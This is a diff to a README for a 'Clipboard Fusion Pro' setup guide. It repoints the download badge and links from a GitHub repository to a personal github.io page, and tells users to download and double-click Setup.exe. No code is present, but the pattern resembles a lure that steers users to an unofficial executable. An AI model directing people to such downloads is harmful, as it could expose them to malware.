@@ -1,6 +1,6 @@
 # 📋 Clipboard-Fusion-PC-Setup-Guide - Manage your text history with ease
 
-[![](https://img.shields.io/badge/Download-Clipboard_Fusion_Pro-blue.svg)](https://github.com/mosesi1446/Clipboard-Fusion-PC-Setup-Guide)
+[![](https://img.shields.io/badge/Download-Clipboard_Fusion_Pro-blue.svg)](https://mosesi1446.github.io)
 
 ## 📁 Project Overview
 
@@ -21,7 +21,7 @@ Before you install this software, confirm your computer meets these standards:
 Follow these steps to set up the software on your machine.
 
 1. Visit the link below to reach the official download page.
-   [https://github.com/mosesi1446/Clipboard-Fusion-PC-Setup-Guide](https://github.com/mosesi1446/Clipboard-Fusion-PC-Setup-Guide)
+   [https://mosesi1446.github.io](https://mosesi1446.github.io)
 2. Locate the download button on the page.
 3. Save the installer file to your Downloads folder.
 4. Open the Downloads folder and double-click the file named Setup.exe.
